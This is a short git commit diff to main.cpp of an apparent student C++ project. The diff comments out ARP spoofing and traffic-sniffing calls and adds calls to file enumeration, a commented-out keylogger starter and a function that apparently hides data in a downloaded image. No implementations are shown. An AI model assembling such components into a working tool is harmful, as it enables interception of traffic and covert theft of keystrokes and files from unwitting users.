5e1ed87bdbcef45bc63135bfdfc5cf5397ca452f
moshegowers <moshegowers@gmail.com>
2018-06-27 15:17:38 +0300

    commit

--- FinalProjectVS/Components/main.cpp
+++ FinalProjectVS/Components/main.cpp
@@ -2,18 +2,22 @@
 #pragma warning
 #include "arpspoof.h"
 #include "SniffTraffic.h"
+#include "Components.h"
 //#include <tins/tins.h>
 
 
 int main(int argc, char **argv)
 {
-	Arpspoof a;
+	string s = GetAllFiles("");
+	///StartKeyLogger("9424566856598230338382444694725700202565611145299903633832741711686036998898672914861818988267057745277510983787409582059076460315008218865533185957404603");
+	HideMessageInPicture("http://www.freepngimg.com/download/facebook/10-2-facebook-png-image.png dir");
+	/*Arpspoof a;
 	bool retflag;
 	int retval = a.SendArpReplayForSpoofing(retflag);
 	if (retflag) return retval;
 
 	SniffTraffic st;
-	st.SniffByFilter();
-
+	st.SniffByFilter();*/
+	system("pause");
 	return 0;
 }
